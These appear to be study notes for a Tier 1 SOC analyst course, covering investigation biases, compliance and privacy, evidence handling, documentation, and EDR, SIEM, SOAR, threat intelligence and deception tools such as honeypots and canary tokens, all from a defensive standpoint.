    Confirmation bias Seeking evidence that supports an existing belief, ignoring contradictions Alert says "possible malware" → analyst only looks for malware signs, ignores normal-activity signs Ask: "what evidence contradicts my assumption?"
    Anchoring Fixating on the first piece of information seen "User mistyped password" leads to assuming benign failures, even as later logs suggest brute force Pause and re-evaluate as new data arrives
    Normalcy bias Assuming activity is harmless because it's routine / familiar Ignoring unusual traffic because "that server always generates noise" Compare against baselines, not comfort / familiarity
    Availability bias Relying on what's most memorable / top-of-mind Recently saw phishing → treats every email alert as phishing without validating Use structured investigation steps, not memory alone

    Communicating without bias: document only facts, avoid assumptions in notes, clearly separate observations from analysis from conclusions, ask a peer to review when unsure.

  4. 5.4

    Staying Current in Cybersecurity

    The threat landscape changes daily (new vulnerabilities, TTPs, tools, regulations). Analysts need to track: attack techniques (MITRE ATT&CK updates), new vulnerabilities / patches, threat-intel trends, changes in their own environment, security tools, and major industry incidents — "you don't need to know everything, just what's relevant to your environment."

    Sources:

    • Free: CISA alerts, US-CERT / NCSC, MITRE ATT&CK updates, BleepingComputer, KrebsOnSecurity, vendor blogs.
    • Internal: IR briefings, internal threat-intel feeds, post-incident reviews.
    • Community engagement: security Slack / Discord groups, trusted researchers, webinars, local meetups like OWASP chapters.

    Continuous-learning cadence:

    • Daily — 5–10 min headline / dashboard scan.
    • Weekly — 1–2 threat reports, a short training / webinar, review of major incidents.
    • Monthly — a short course, update tool / log knowledge.

    "Consistency beats intensity."

06

Governance, Ethics & Documentation

  1. 6.1

    Compliance and Legal Responsibilities

    Compliance = following the laws, regulations, standards, and internal policies that govern how an org operates — ensuring proper handling of sensitive info, legal adherence, and industry-best-practice alignment. Drivers: regulatory requirements, industry standards, contractual obligations, internal policies.

    Legal responsibilities = actions an org is legally required to take to protect data / systems / users: protecting customer data, reporting certain breaches, following cybersecurity / privacy laws, ensuring proper access control.

    Common laws / regulations:

    • GDPR (EU) — protects personal data, requires breach notification within 72 hours.
    • HIPAA (US) — protects healthcare data, requires strict access control / auditing.
    • SOX (US) — accuracy of financial reporting, controls over financial systems.
    • PCI-DSS — protects payment-card data.

    SOC analyst's role:

    • Monitoring & Detection — spotting policy violations, unauthorized access, exfiltration indicators.
    • Documentation — accurate investigation notes, audit-ready evidence.
    • Reporting — escalating incidents that may violate laws / standards, supporting legal / compliance teams.
  2. 6.2

    Privacy

    Privacy = an individual's right to control how their personal information is collected, used, stored, and shared. Matters because it builds trust, is legally required, prevents identity theft / fraud, and reduces reputational risk.

    Personal data examples: name / address / phone, email / IP address, employee ID, financial info, health info, login credentials, behavioral data (logs, web activity).

    Key privacy principles:

    • Minimization — collect only what's needed.
    • Purpose Limitation — use data only for its intended purpose.
    • Access Control — only authorized people view it.
    • Transparency — people know how it's used.
    • Protection — secured from misuse.

    Laws to know: GDPR (EU), CCPA / CPRA (California — consumer data rights, opt-out), HIPAA (US healthcare), PCI-DSS (payment data).

    SOC analyst responsibilities: avoid unnecessary access to personal data; only view what's needed for the investigation; report suspected exposure immediately; never share sensitive data outside approved channels; keep notes factual, free of unnecessary personal detail. Ask before accessing: "Do I need this? Am I storing it unnecessarily? Could I use masked / anonymized data instead?"

  3. 6.3

    Data Handling and Evidence Preservation

    Improper handling can destroy evidence, compromise investigations, violate policy / law, and cause disciplinary / legal consequences.

    "Evidence" includes anything that might be used in a security investigation, IR, or legal / regulatory matter: log files, alert details, network captures, email headers, endpoint telemetry, screenshots, system artifacts — "if it helps explain what happened, it's evidence."

    Key principle: integrity. Evidence must be accurate, unaltered, and complete. Avoid modifying timestamps, editing log files, changing system states, or deleting / overwriting items — if integrity is lost, evidence becomes unreliable.

    Chain of custody: track Who / What / When / Where / How for every piece of evidence. As a Tier-1 analyst you may not manage the formal chain-of-custody forms, but you must still handle data in a way that preserves it if needed later.

    Do's: collect data ASAP; preserve original logs where feasible; screenshot volatile data; export logs unmodified; use approved tools / storage; document what you found and how.

    Don'ts: alter / delete logs; copy evidence to personal devices; share screenshots / data over unapproved channels; "clean up" systems before IR reviews them; act outside approved scope.

    Handling by evidence type:

    • Log evidence — a primary source; export in read-only formats (CSV / JSON / text); note the time range and preserve timezones / timestamps; collect broadly, analyze narrowly; document search queries used.
    • Endpoint & network evidence — avoid running unapproved commands on a compromised host; avoid rebooting or isolating a machine unless instructed; refer collection tasks to senior analysts / IR when needed — your primary job is to observe, document, and escalate.
    • Volatile evidence (RAM, running processes, active connections, logged-in sessions, temp files) — if you see volatile indicators: capture screenshots, document timestamps, notify IR immediately — "every second counts."
  4. 6.4

    Ethical Use of Tools and Information

    SOC analysts have access to sensitive tools / data; misuse can cause legal, financial, and career-ending consequences.

    "Ethical use" = using security tools and information only for authorized, legitimate organizational purposes. Analysts may access logs of user behavior, email / message metadata, system / account info, endpoint / network monitoring, and vulnerability / config data — this access requires caution and responsibility.

    Boundaries — analysts must NOT: view private data out of curiosity; investigate coworkers / individuals without authorization; access systems / logs unrelated to assigned work; search for "interesting" data without cause; share sensitive information outside proper channels.

    Privacy & least privilege: view only what the task requires, never copy / store personal data locally, use elevated privileges only when required.

    Proper tool use examples: SIEM queries only for assigned alerts; EDR investigations only when investigating suspicious activity; packet captures only when authorized; vulnerability tools only against approved scan targets.

    Handling sensitive information: keep investigation data confidential; use approved communication channels; protect data at rest / in transit; avoid discussing incidents with unauthorized staff; think "would this be acceptable during an audit?"

    Conflicts of interest (e.g., investigating someone you have a personal relationship with, using access for non-work reasons) — disclose and ask for reassignment; transparency builds trust.

    Reporting ethical concerns (tool misuse, unauthorized access, policy violations, privacy breaches): report immediately to leadership / compliance / security management, don't confront individuals directly, follow org reporting channels.

    Decision-making framework — before acting, ask: Is this within my authorized role? Does policy allow it? Is it necessary for the investigation? Could it harm someone's privacy? Would I be comfortable explaining it to leadership? If uncertain — stop and ask.

  5. 6.5

    Reporting and Documentation Standards

    "If it isn't documented, it didn't happen." Good documentation ensures investigations are repeatable / traceable, supports escalation / handoffs, creates a legal / audit-ready record, helps leadership decide, and improves SOC efficiency.

    What counts as documentation: investigation notes, event timelines, evidence collected (logs / screenshots / queries), escalation summaries, incident reports, ticket updates / case notes.

    Core principles:

    • Accuracy — facts, not assumptions.
    • Clarity — write simply / directly.
    • Completeness — include everything needed to understand the investigation.
    • Consistency — follow SOC templates / style.
    • Timeliness — document as you go, not after.

    Effective investigation notes should include: what triggered the investigation, tools used, commands / queries run, evidence found (and not found), decisions made and why, time-stamped activity. (Tip: bullet points for clarity.)

    Timelines reconstruct events — include timestamps, event descriptions, data source (SIEM / firewall / EDR), and key findings, e.g.:

    02:15 UTC – Successful login from unfamiliar IP → 02:17 UTC – PowerShell spawned by non-admin user → 02:18 UTC – Lateral movement attempt blocked.

    Every ticket should include: a clear title, description of the alert / issue, step-by-step notes, evidence / queries used, final disposition (true positive / false positive / inconclusive), who handled it and when — tickets become official records for auditors and leadership.

    Confidentiality in documentation: include only necessary data; avoid unrelated personal info; never disclose sensitive details in open channels; must comply with internal policy and privacy laws (GDPR, HIPAA, etc.).

    Consistency practices: standardized templates, naming conventions, organized notes, concise narrative writing, review before closing a case — "consistency builds SOC maturity."

Understanding Tool Integration and Data Flow

  1. 5.1

    The Data Flow Pipeline

    Data sources → Log aggregation layer → SIEM / Data Lake → Detection Engine → Alert Management → Investigation & Analysis Layer → Response Layer → Continuous Improvement (feeding back into the cycle).

    • Data sources — endpoints, network devices, cloud platforms, applications, identity systems.
    • Aggregation — syslog servers, log forwarders (Splunk UF, Filebeat), API collectors, cloud-native connectors.
    • SIEM / Data Lake — raw storage, parsed / normalized events, indexing, retention.
    • Detection Engine — correlation rules, anomaly detection, ML models, TI matching → generates alerts.
    • Alert Management — prioritization, deduplication, enrichment, routing to analysts.
    • Investigation — SOAR orchestration, EDR deep dive, sandbox, TI, forensic tools.
    • Response — automated containment, manual remediation, ticket management, stakeholder comms.
    • Continuous Improvement — new detection rules, tuned alerts, updated playbooks, TI sharing.
  2. 5.2

    Worked Example — Ransomware Data Flow

    1. t0 — Infection

      User opens attachment, malware executes.

    2. t1 — Telemetry

      EDR agent collects process / file / network / registry telemetry and forwards to SIEM.

    3. t2 — Detection

      EDR flags behavior, auto-isolates; SIEM correlation rule fires moments later, enriched with TI, generates its own alert.

  3. 5.3

    Integration Challenges
    • Data format inconsistencies (CEF / LEEF / JSON / custom) — solved by normalizing in the SIEM.
    • Authentication / credential management overhead — solved with secrets management + least-privilege service accounts.
    • Version updates breaking integrations — solved with API versioning + change management.
    • Ongoing integration maintenance burden — solved by preferring vendor-built integrations and assigning clear ownership.

Endpoint Detection and Response (EDR)

  1. 6.1

    Mission & Impact Stats

    Mission: detect threats that bypass traditional defenses, investigate with detailed telemetry, respond quickly to contain / remediate, hunt proactively.

    Impact stats cited:

    • Average EDR deployment cuts breach-detection time from 200+ days to <24 hours.
    • ~60% of successful ransomware is stopped at the endpoint.
    • Tier 1 analysts spend 40–50% of their time on EDR alerts.
  2. 6.2

    The Journey from AV to EDR

    1. 1990s — Signature-based AV

      Only catches known malware.

    2. 2000s — Next-Gen AV

      Signatures + heuristics + ML, still limited visibility.

    3. 2010s — EDR

      Behavioral analysis + IOC matching + TI, full telemetry, can investigate / contain / hunt.

    4. 2020s — XDR

      Endpoint + network + cloud + email correlation, unified telemetry, automated cross-platform response.

    Why traditional AV failed: signature-only (misses zero-days / fileless / polymorphic malware), no context ("malware detected" but no attack-chain visibility), and only delete / quarantine with no containment or forensic capability.

  3. 6.3

    Architecture
    • Agent (Sensor) — lightweight, kernel / SYSTEM-level, monitors process creation / termination, file operations, registry changes, network connections, authentication, DLL loads, and script execution in real time.
    • Cloud Platform (the brain) — receives all telemetry, stores 30–90 days of data, runs detection algorithms, correlates across endpoints, integrates TI, generates alerts.
    • Analyst Console (the interface) — web dashboard for real-time / historical investigation, response controls, reporting.
  4. 6.4

    How EDR Identifies Threats (high → low confidence)

    1. Signature-based

      Fast, accurate for known malware, misses new variants.

    2. IoC matching

      Checks IPs / domains / paths against TI, reactive.

    3. Behavioral analysis

      The real differentiator — flags process injection, LSASS credential dumping, PsExec / WMI lateral movement, encoded PowerShell, unusual parent-child relationships (e.g., Word spawning PowerShell), mass file encryption, LOLBins abuse.

    4. Machine learning

      Anomaly / zero-day detection, can false-positive.

    5. Custom threat-hunting rules

      Org-specific logic.

  5. 6.5

    Console Workflow for Tier 1

    The dashboard tracks:

    • Active-alert counts / trends.
    • Endpoint health — coverage %, agents offline / crashed.
    • Threat metrics — blocked in last 24 h.
    • Response metrics — MTTD / MTTR against SLA benchmarks (e.g., <15 min detection, <60 min containment).
  6. 6.6

    Alert Severity Tiers
    SeverityExamplesResponse window
    CriticalActive ransomware, confirmed malware, credential theft, active exfilClaim immediately
    HighHigh-confidence suspicious behavior, known IOCs, lateral movementWithin 30 min
    MediumPolicy violations, unconfirmed anomaliesWithin 4 hours
    LowInformational, blocked reconBatch-review
  7. 6.7

    Triage Workflow

    1. Sort by severity

      Never work in received order.

    2. Check for duplicates

      Group same-family / same-endpoint alerts.

    3. Claim the alert

      Assign it to yourself before starting work.

    4. 2-minute quick assessment

      Get the shape of the alert fast.

    5. Decide

      Escalate / contain & document / close as false positive / continue investigating.

  8. 6.8

    Smart Filtering Patterns
    • "What needs attention now" — critical + high, new, last 8 hours.
    • "Is this an outbreak" — same malware family across endpoints, grouped.
    • "Handover prep" — my in-progress alerts by severity.
  9. 6.9

    Common Mistakes
    • Working alerts in received order instead of by severity.
    • Over-spending time on low-severity alerts.
    • Not claiming alerts.
    • Closing without documentation.
    • Over-escalating to avoid work.

SIEM (Security Information and Event Management)

  1. 7.1

    What SIEM Is / Without It

    A centralized platform that collects logs from the whole infrastructure, normalizes them into a common format, correlates events to find patterns, alerts analysts, and stores historical data for investigation / compliance.

    Without one: logs are scattered, connections between events are invisible, manual review doesn't scale, detection is delayed by days / weeks, and there's no compliance evidence trail.

  2. 7.2

    The Four Core Functions

    1. Collect

      Via syslog, API, agent-based forwarders (Splunk UF, Azure Monitor Agent), file upload, or DB queries, from sources like Windows / Linux logs, firewalls, IDS / IPS, web proxies, EDR telemetry, cloud logs, authentication systems, email gateways, and applications.

    2. Normalize

      Converts each source's own format (e.g., Windows EventID fields, Linux syslog lines, firewall PERMIT/DENY strings) into common fields (event_type, action, user, source_ip, timestamp).

    3. Correlate

      Finds meaningful relationships between separate events using time-based, threshold-based, pattern-based, anomaly-based, and geolocation-based ("impossible travel") rules. Worked example: 3+ failed RDP logins within a minute, followed by a success, followed by a login to a different server within 5 minutes → alert for brute force + lateral movement.

    4. Alert

      Generates a scored, severity-tagged alert and routes it via dashboard, email, chat, ticketing, SMS, or webhook to SOAR. Alert tuning is a constant balance: too sensitive causes fatigue, too lenient misses real threats.

  3. 7.3

    Scale Reality

    A modern SIEM can ingest 100s of GB to multiple TB / day. Example breakdown: 420 GB / day split across Windows security logs, firewall, proxy, EDR telemetry, cloud logs, AD, IDS / IPS, email gateway, applications.

  4. 7.4

    Critical Log Sources
    • Windows Event IDs — 4624 success / 4625 fail logon, 4672 admin rights assigned, 4720 account created, 4732 group add, 4688 process creation, 4698 scheduled task, 4719 audit policy change.
    • Linux / Unix syslog paths — /var/log/auth.log, /var/log/syslog, /var/log/secure.
    • Firewall log fields — timestamp, src / dst IP:port, protocol, action, bytes, matched rule.
    • EDR data.
    • Cloud platform logs — CloudTrail, Azure Activity Logs.
    • Authentication logs — AD lockouts / password changes / Kerberos events; MFA / SSO login attempts, failures, impossible travel, new-device registration.
08

SOAR (Security Orchestration, Automation & Response)

  1. 8.1

    The Value Proposition — 15-to-2 Minute Math

    SOAR brings a 15–20 minute manual task down to 2–3 minutes.

    The math on why automation is necessary: an 8-hour shift is 480 minutes; at 15 min/alert that's a theoretical max of 32 alerts, reduced to ~20–25 once meetings / breaks / escalations are factored in — but 200 alerts a day actually need triage, leaving a 175–180 alert backlog every single day without automation.

    Worked example — phishing alert: manually investigating one phishing alert takes ~17 minutes of repetitive steps (read, extract sender, check reputation, extract URLs, check URL reputation, extract attachments, check hash reputation, query SIEM for other recipients, create ticket, document, decide, contain); SOAR does all of that instantly, leaving the analyst only ~6 minutes of actual reading and deciding.

  2. 8.2

    The 80/20 Rule

    ~80% of alerts need the same repetitive tasks (reputation checks, user lookups, ticket creation, basic containment); ~20% need real human analysis (advanced hunting, complex forensics, business-context judgment, novel techniques) — SOAR is built for the 80%.

    SOAR also delivers scalability without headcount (3× the endpoints / alerts doesn't require 3× the analysts) and consistency (every alert gets the same checks every time, regardless of which analyst or which shift).

  3. 8.3

    Architecture — 4 Components
    • Playbook Engine — runs step-by-step automated workflows.
    • Case Management — creates / tracks tickets, stores evidence, manages assignment.
    • Integration Hub — the API connection layer to every security tool (REST APIs, webhooks, CLI).
    • Reporting & Analytics — tracks automation efficiency, MTTR improvement, compliance reports, ROI.
  4. 8.4

    Core SOAR Capabilities
    • Automatic enrichment — parallel reputation / context lookups saving 5–10 min / alert.
    • Orchestrated multi-step investigation — a 20-minute manual chain becomes a 2-minute automated one.
    • Automated containment — isolate, block, disable, delete, ticket, notify — all in seconds for high-confidence cases.
    • Consistent response — same steps every time.
    • Cross-tool correlation — auto-compiling a full attack story across EDR / SIEM / email / AD / firewall.
    • Workflow standardization — new analysts ramp faster by following playbooks.
    • Automatic documentation — full audit trail of every action / timestamp.
  5. 8.5

    Playbooks

    A playbook is a pre-defined automated workflow — "a recipe."

    Types:

    • Enrichment — gather context.
    • Investigation — query / correlate across tools.
    • Containment — isolate / block / disable / delete.
    • Remediation — clean / restore / patch / reset.
    • Notification — alert stakeholders.
    • Compliance — meet regulatory requirements, e.g. a GDPR 72-hour breach report.

    Execution modes:

    • Fully Automated — no human input (high-confidence, low-risk actions like blocking a known-bad IP).
    • Semi-Automated — enrich → human review → approve → execute (medium-risk actions like isolating an endpoint).
    • Manual — analyst-triggered (on-demand or complex scenarios).

    Anatomy of a playbook: Trigger (what starts it) → Inputs (data it needs) → Actions (API calls, decisions, loops, wait conditions, human tasks, sub-playbooks) → Conditions (decision points) → Outputs (results produced).

    Logic patterns: sequential, conditional / branching, loop, parallel, and sub-playbook (calling another playbook).

    Error handling uses try / except-style logic (e.g. if a firewall API call fails, log the error, alert the analyst for manual action, and continue).

    Best practices: keep it simple (break into sub-playbooks), handle errors, add wait conditions, document thoroughly, test with multiple scenarios, version-control changes, and include human checkpoints for risky actions.

  6. 8.6

    Common Automation Patterns
    1. Alert enrichment — parallel reputation / user / endpoint / SIEM lookups.
    2. Containment and response — instant isolate / kill / block on malware detection.
    3. Phishing response — automated header / URL / hash analysis and delete-vs-quarantine decision.
    4. User account compromise — risk-scored automatic account disable / session revoke / password reset.
    5. Vulnerability response — automatic asset inventory, verification, patch tracking for something like a new Log4j-style CVE.
    6. IoC hunting — automatically querying EDR / SIEM / firewall / proxy / email gateway against a fresh batch of threat-intel IOCs.
  7. 8.7

    Enrichment in Depth

    A bare alert ("Failed login from IP 203.0.113.45") becomes actionable once SOAR pulls in:

    • AD context — role, manager, group memberships, VIP flag.
    • SIEM / auth baseline — normal login times / locations / devices vs. this login's anomalies.
    • CMDB data — asset criticality, business impact of isolating it, owner contact.
    • File-server / DLP activity — recent sensitive-file access and whether it's normal for the role.
    • Firewall / network data — any connections to known-malicious infrastructure.
    • HR / project context — any legitimate business reason for the activity.

    Turning a Medium-severity alert into a Critical one with clear recommended actions.

  8. 8.8

    SOAR for Tier 1 Analysts

    SOAR handles enrichment, data gathering, initial triage / scoring, low-risk containment, ticketing, and notifications; the analyst still:

    • Reviews enriched alerts.
    • Makes the final verdict.
    • Approves high-risk / business-sensitive actions (e.g., overriding an auto-isolation of the CEO's laptop 10 minutes before a board presentation in favor of a less disruptive containment).
    • Requests deeper forensics when signals conflict.
    • Closes clear false positives with documented reasoning.
    • Runs playbooks manually for bulk / on-demand work.
    • Adds the business context SOAR's logs can't capture.

    With SOAR, a Tier 1 analyst's time shifts from ~60% data-gathering / 20% triage / 15% investigation to ~5% data-gathering / 30% triage / 45% investigation / 10% hunting / 10% playbook improvement.

  9. 8.9

    Handling Exceptions & Continuous Improvement

    Handling exceptions:

    • API errors — fall back to manual action via the tool's console, notify the SOAR admin.
    • Conflicting enrichment signals — use judgment, treat as suspicious until proven otherwise, escalate if still unclear.
    • Business-context needs — verify with the business owner before treating something as malicious.

    Continuous improvement: report false positives with detailed notes so playbooks get tuned monthly; suggest new automations when you notice yourself doing the same manual task repeatedly.

  10. 8.10

    Escalate vs. Auto-Resolve

    Auto-close is fine for: a low threat score with a clear false positive, known-good recurring activity, or successful automated remediation with zero impact.

    Never auto-close when: a critical asset, VIP user, possible exfiltration, lateral movement, a brand-new threat pattern, or a compliance / regulatory requirement is involved.

    Human review is required for: medium threat scores (50–79), business-impact tradeoffs, unusual patterns with no existing playbook, and compliance / legal-sensitive incidents (healthcare / HIPAA, financial / PCI-DSS, EU / GDPR, executive communications — these can never auto-close).

    Escalate to Tier 2/3 when the investigation needs advanced / forensic expertise (multi-stage attack, APT indicators, unknown malware family) or when compromise is already confirmed (credential theft, lateral movement, active exfiltration, established persistence, an attacker still active).

Threat Intelligence & IoC Enrichment

  1. 9.1

    Why TI Matters
    • Speed — intel-driven hunting gets ahead of an attack instead of waiting to detect-then-respond.
    • Context — turns "we blocked a suspicious IP" into "we blocked APT29's C2 server for their latest campaign against government contractors."
    • Prioritization — targeted-industry threats become CRITICAL, generic malware stays ROUTINE, instead of treating every alert equally.
    • Efficiency — a manual 20-minute IoC lookup becomes a 30-second platform query.
  2. 9.2

    Types of Intelligence (by audience)
    TypeAudienceContentHorizon
    StrategicExecutivesHigh-level landscape / geopolitical trends6–12 months
    OperationalSOC managers / IRSpecific campaigns and adversary methodologyWeeks–months
    TacticalAnalysts / engineersTTPs, attack patterns, detection / mitigation strategyDays–weeks
    TechnicalTier 1–3 analystsSpecific IOCs — IPs, domains, hashes, URLsReal-time / tactical

    As a Tier 1 analyst you primarily consume Technical intel (~80% of your TI work — block / hunt / detect on specific IOCs) plus some Tactical (~20% — understanding how an attacker like Emotet operates, so you know what to look for next).

  3. 9.3

    Intelligence Quality Tiers
    • Best — specific, timely, actionable (active-campaign IOCs, zero-day indicators).
    • Good — recent, relevant, contextual (last-30-day, industry-specific).
    • Useful — general, older, broad.
    • Noise — outdated, no attribution, no context (e.g. a 5-year-old IOC).
  4. 9.4

    The Threat Intelligence Lifecycle (6 stages, cyclical)

    1. Planning & Direction

      Define what you need to know.

    2. Collection

      OSINT, commercial feeds, ISACs, internal data, government sources.

    3. Processing

      Normalize to STIX, deduplicate, correlate, tag.

    4. Analysis

      Add context — who, why, relevance, confidence.

    5. Dissemination

      Route technical IOCs to analysts, tactical TTPs to IR, strategic reports to management, automated feeds to tools.

    6. Feedback

      Measure whether a feed was actually useful; cancel low-accuracy sources — back to Planning.

    As a Tier 1 analyst you mainly operate in stages 5–6 — consuming IOCs, using them in investigations, hunting with them, and feeding back accuracy — you typically don't collect raw intel or write strategic reports, but you do contribute false-positive reports, IOCs found during incidents, and suggestions for what intel would help.

  5. 9.5

    Threat Intelligence Platform (TIP)

    Solves four problems:

    • Too many disparate sources — aggregates and normalizes them, cutting collection time from ~2 hours / day to ~5 minutes.
    • No context — turns a bare IP into a fully attributed, scored, campaign-linked indicator.
    • Inability to operationalize intel — automatically pushes IOCs to firewall / SIEM / EDR / proxy instead of manual copy-paste.
    • No feedback loop — tracks per-feed accuracy so low-quality subscriptions get cancelled.

    Key TIP capabilities: aggregation, normalization (to STIX / TAXII), deduplication (cuts noise 80–90%), and enrichment (malware family, actor attribution, confidence score, related IOCs, MITRE ATT&CK mapping, recommended actions).

  6. 9.6

    IoC Fundamentals & the IoC Pyramid

    An Indicator of Compromise is forensic data identifying potentially malicious activity.

    The IoC Pyramid (most to least valuable to an attacker, i.e. hardest to least-hard for them to change):

    1. TTPs — best — forces a full methodology change.
    2. Tools / malware signatures — good — forces new tool development.
    3. Network / host artifacts — useful.
    4. IPs / domains — easiest for attackers to rotate.

    IPs / domains remain very useful for Tier 1's immediate tactical response.

  7. 9.7

    IoC Types
    • IP addresses — short lifespan, shared-hosting false positives, residential-proxy risk.
    • Domain names — C2 / phishing / malware-distribution / exfiltration domains; red flags include very recent registration, free / abused TLDs, privacy-protected WHOIS, typosquatting, keyword stuffing.
    • File hashes — MD5 / SHA1 / SHA256; SHA256 is the current standard; a permanent, unique identifier for that exact file, but any single-byte change or packing breaks the match.
    • URLs — each component (domain / path / query) can itself be an IOC.
    • Email addresses — sender is often spoofed; Reply-To and Return-Path are more reliable.
    • Registry keys — Windows persistence locations.
    • File paths — common malware drop locations.
    • Mutex names — identify specific malware variants / active infections.
    • User-agent strings — unusual / scripted agents in HTTP requests.
  8. 9.8

    IoC Lifecycle & Aging

    1. Fresh (0–7 days)

      Block / hunt aggressively.

    2. Recent (7–30 days)

      Maintain blocks, weekly hunting.

    3. Aging (30–90 days)

      Keep blocks, watchlist only.

    4. Stale (90+ days)

      Remove blocks to avoid false positives, archive.

    5. Expired / Archived

      Retire from active use.

    Aging thresholds differ by type: IPs go stale fastest (90+ days), domains slower (180+ days), URLs similar to IPs, email addresses slower still (180+ days) — but file hashes never expire, since a hash uniquely and permanently identifies one exact file.

  9. 9.9

    Context Is What Makes an IoC Actionable

    A bare IP is unusable; the same IP with threat / malware-family / actor / campaign attribution, first / last-seen timestamps, confidence score, source count, MITRE mapping, related IOCs, and target-industry relevance becomes a clear, prioritized action item.

    Critical context elements: confidence level, age / freshness, attribution, target relevance, campaign association, and MITRE ATT&CK mapping.

  10. 9.10

    Enrichment Tools
    • VirusTotal — multi-vendor detection + community reputation for files / IPs / domains / URLs.
    • AbuseIPDB — abuse-report confidence score and category. Best for known scanners / brute-forcers, less useful for sophisticated APTs using clean IPs or residential proxies.
    • WHOIS — domain registration / age. Very new domains (days to weeks old) are a strong phishing / malware red flag; domains 90+ days or 1+ years old are more likely legitimate (though compromised legitimate sites can still be old).
    • Passive DNS — historical resolution data. Used to pivot from a known-bad domain outward to related IPs / domains and infer attacker infrastructure patterns.
  11. 9.11

    Standards — STIX & TAXII

    STIX is the language for describing threat data (Indicator, Malware, Threat Actor, Campaign, Attack Pattern, Vulnerability, etc. as structured objects); TAXII is the delivery protocol for sharing it.

    As a Tier 1 analyst you mostly just consume IOCs already normalized by your TIP.

  12. 9.12

    TI-Driven Investigation Checklist

    1. Gather context

      What does TI say, confidence, active / old, campaign, attribution?

    2. Assess relevance

      Targets our industry? Recent hits elsewhere? Impact / priority?

    3. Identify related indicators

      Should we hunt / block the wider infrastructure?

    4. Understand TTPs

      How does this threat operate? What attack stage? Which ATT&CK techniques?

    5. Take informed action

      Comprehensive blocking, hunting, containment, escalation, full documentation.

  13. 9.13

    Blocking Strategy

    Multi-layered by design (network perimeter + endpoint + detection / response, redundantly) and specific to IoC type:

    • IPs — firewall / IDS-IPS / proxy / SIEM (watch for shared-hosting and CDN false positives).
    • Domains — DNS sinkhole / proxy / email gateway / SIEM.
    • File hashes — EDR / email gateway / AV / application-whitelisting (hashes never expire but polymorphic malware defeats them).
    • URLs — proxy / email gateway / browser (block the whole domain pattern, not just one exact URL).
    • Email addresses — gateway / SIEM (remember spoofing means SPF / DKIM / DMARC matter more than sender blocking alone).

    Best practices: block comprehensively across layers, block related IOCs found via TI, document the reasoning, set expirations (except hashes), monitor effectiveness, and review blocklists monthly.

  14. 9.14

    Threat Hunting with TI

    Proactive (get intel → hunt for IOCs → find hidden threats) rather than reactive (wait for an alert to fire).

    Workflow:

    1. Gather fresh intel

      Prioritize campaigns targeting your industry.

    2. Import IOCs into hunting tools

      SIEM / EDR queries.

    3. Hunt across data sources

      SIEM, EDR, firewall, DNS, email, proxy.

    4. Analyze results

      No matches → document and keep monitoring; matches → investigate and escalate if confirmed.

    5. Iterate and expand

      Hunt for related IOCs, check for lateral movement, determine dwell time.

    Hunting cadence:

    • Daily — 15–30 min on fresh / critical IOCs.
    • Weekly — 1–2 hours on behavioral patterns / emerging threats.
    • Monthly — half day for comprehensive campaign review, historical look-back.
    • Ad-hoc — breaking news (e.g., a major new CVE), industry-specific alerts, post-incident hunts.

Advanced Analysis Tools

  1. 10.1

    Why Standard Tools Aren't Enough

    The standard SOC stack (SIEM, EDR, SOAR, firewall, AV) is necessary but not always sufficient, because modern attackers use advanced evasion, blend into normal behavior, abuse legitimate tools (Living off the Land), dwell for months, exfiltrate slowly, and encrypt to hide activity — meaning zero-days, insider threats, slow-and-low attacks, APTs, and supply-chain compromises can slip past traditional tools.

    The philosophy shift is from purely reactive defense (wait → detect → respond) to proactive + deceptive defense (plant traps → deceive → detect earlier → gather intel → respond faster).

  2. 10.2

    Deception Technology Overview

    Deception technology deploys fake assets (files, credentials, systems) as tripwires: any interaction with them is inherently malicious, since legitimate users never touch them — giving a near-zero false-positive rate and detection often within hours instead of the 200+ day industry-average dwell time.

  3. 10.3

    Canary Tokens

    Simplest, free — via canarytokens.org. Files, URLs, DNS names, or AWS keys that alert the moment they're opened / visited / resolved / used.

    Placement: tempting, realistic names (Executive_Compensation_2026.xlsx, AWS_Production_Keys.txt) in locations attackers actually search — git repos (fake .env / config secrets), email, internal wikis, database dumps.

    Alerting: route to a SOC distribution list / webhook / SIEM (never a single personal inbox).

    On trigger, first triage question:

    • Internal IP + business hours — possibly legitimate, investigate.
    • External IP — confirmed breach, escalate immediately.
    • Off-hours / unusual location — high suspicion.
  4. 10.4

    Honeytokens

    More sophisticated fake credentials:

    • Fake DB connection strings.
    • Fake cloud API keys (paired with fake S3 / EC2 / RDS resources to feed attackers false data).
    • Fake SSH keys (that lead to a monitored honeypot shell).
    • Fake AD service accounts (alerting on any authentication or privilege-escalation attempt).
    • Realistic fake documents seeded with tracking (web bugs, hidden metadata) so you can trace where exfiltrated "data" ends up.
  5. 10.5

    Honeypots

    Entire fake systems rather than single files; because they have zero legitimate users, any interaction is by definition malicious (pure signal, zero false positives).

    Range:

    • Low-interaction — simulated services like Cowrie / Dionaea, safe, easy.
    • Medium-interaction.
    • High-interaction — full real OS, maximum realism and intel value, but requires strict isolation.
    • Specialized variants — database, web-app, ICS / SCADA, IoT honeypots.

    Deployed strategically: DMZ (catch external attackers), internal user VLAN (catch lateral movement), critical-asset segment (early warning for crown jewels), cloud (fake instances / databases / buckets).

    Configuration should mimic a real system convincingly (realistic hostname / IP / banner / services) with an attractive name, should accept weak / default credentials to "let attackers succeed" into a monitored fake environment.

    Alert tiering: log-only noise (a bare port scan) up through CRITICAL (a known employee credential, or a critical-segment internal IP touching a honeypot it should never reach — e.g., an HR workstation hitting a "backup file server" at 3 AM).

  6. 10.6

    Network Decoys

    Infrastructure-level deception:

    • Fake SMB shares with tempting names (seeded with canary tokens, alerting on Event ID 4663 file access by anyone outside known admins).
    • Fake internal web apps — a fake admin panel or DB-management tool that logs every login attempt and click.
    • Fake network printers / IoT devices (common initial-compromise targets).
    • Fake databases.
    • Fake git repositories carrying honeytokens.
  7. 10.7

    Active Defense

    Going beyond passive detection to make the environment actively hostile: increase the attacker's cost in time / effort / risk so they either give up, make mistakes, or take long enough to get caught.

    Legal active defense stays entirely on your own systems (deception, interfering with your own stolen data, gathering intel on attackers inside your environment).

    "Hacking back" into an attacker's own systems or DDoS-ing them is illegal and must never be done.

  8. 10.8

    UEBA (User and Entity Behavior Analytics)

    Builds a behavioral baseline per user / entity and scores deviations from it, risk-tiered:

    Risk ScoreTierAction
    0–30LowLog only
    31–60MediumAlert for review
    61–85HighImmediate investigation
    86–100CriticalAutomatic response (e.g., disable account, isolate host)
  9. 10.9

    DLP (Data Loss Prevention) — Advanced
    • Content-aware / fingerprint DLP — cryptographically fingerprints sensitive documents so it still catches them even after renaming or compressing, unlike simple keyword matching.
